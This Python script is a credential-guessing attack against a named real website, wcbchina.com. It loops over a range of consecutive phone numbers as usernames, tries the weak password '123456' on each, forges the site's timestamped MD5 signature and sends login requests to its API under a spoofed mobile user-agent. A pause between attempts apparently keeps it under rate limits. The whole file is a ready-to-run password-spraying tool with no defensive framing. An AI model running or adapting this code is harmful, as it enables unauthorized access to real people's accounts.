# -*- coding: utf-8 -*-
# @Time    : 2022/1/10 16:44
# @Author  : Cat
# @FileName: wcbchina.py
import json
import time
from hashlib import md5
import requests


def encrypt_md5(s):
    # 创建md5对象
    new_md5 = md5()
    # 这里必须用encode()函数对字符串进行编码，不然会报 TypeError: Unicode-objects must be encoded before hashing
    new_md5.update(s.encode(encoding='utf-8'))
    # 加密
    return new_md5.hexdigest()


for i in range(13588880900,13588880929):
    t = int(time.time() * 1000)
    sign = encrypt_md5(str(t)).upper() # 1641804382114
    username = i
    password = '123456'
    password_enc = encrypt_md5(password).upper()
    auth = {"auth":{"timestamp":t,"sign":sign},"username":username,"password":password_enc}
    auth = json.dumps(auth)
    
    print(auth)
    
    url = 'https://m.wcbchina.com/api/login/login'
    headers = {
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'x-requested-with': 'XMLHttpRequest',
    }
    res = requests.get(url,headers=headers,data=auth)
    print(res.text)
    time.sleep(20)
